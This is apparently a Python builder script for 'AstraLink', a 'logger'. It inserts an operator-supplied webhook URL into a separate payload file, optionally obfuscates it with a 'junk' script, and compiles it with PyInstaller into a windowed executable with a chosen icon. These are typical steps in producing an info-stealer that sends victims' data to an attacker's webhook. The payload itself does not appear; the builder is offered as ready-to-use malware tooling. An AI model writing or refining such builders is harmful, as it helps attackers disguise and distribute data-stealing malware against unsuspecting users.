from pystyle import *
import os
import subprocess
from colorama import *
import time
from tkinter import filedialog, Tk

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

        AstraLink Swift Builder 

    Press Enter or key to Continue.
        
(Beta Version. Might Visibly Look Off...)                                         

"""

Anime.Fade(Center.Center(intro), Colors.blue_to_cyan, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTRED_EX}
      

             
             
             
             
     AstraLink Swift Builder    

      Made By @MetaverseNova
           
(Beta Version. Might Visibly Look Off...)

""")

time.sleep(1)


while True:
    Write.Print("\nWould you like to build the logger or close the builder: ", Colors.green_to_cyan)
    Write.Print("\n1. Build the logger", Colors.green_to_yellow)
    Write.Print("\n2. Close the builder", Colors.red_to_yellow)
    Write.Print("\nSelect an option and press Enter: ", Colors.yellow_to_green, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.BLUE + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "AstraLink.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.cyan_to_green)

        obfuscate = False
        while True:
            answer = input(Fore.BLUE + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nFailed operation. Please follow the instructions and try again.", Colors.red_to_yellow)

        answer = input(Fore.BLUE + "\nDo you want to make the file executable? (Y/N) " + Style.RESET_ALL)
        if answer.upper() == "Y":
            answer = input(Fore.BLUE + "\nDo you want to add an icon? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                Tk().withdraw()  
                icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
                if icon_file:
                    subprocess.call(["pyinstaller", "--onefile", "--windowed", "--icon", icon_file, filename])
                    Write.Print(f"\n{filename} has been converted to exe with the selected icon.", Colors.yellow_to_green)
                else:
                    Write.Print("\nThe file you choose must have .ico extension!", Colors.yellow_to_red)
            else:
                subprocess.call(["pyinstaller", "--onefile", "--windowed", filename])
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.green_to_cyan)

    elif choice == "2":
        Write.Print("\nClosing the builder", Colors.red_to_yellow)
        break

    else:
        Write.Print("\nFailed operation. Please follow the instructions and try again.", Colors.red_to_yellow)
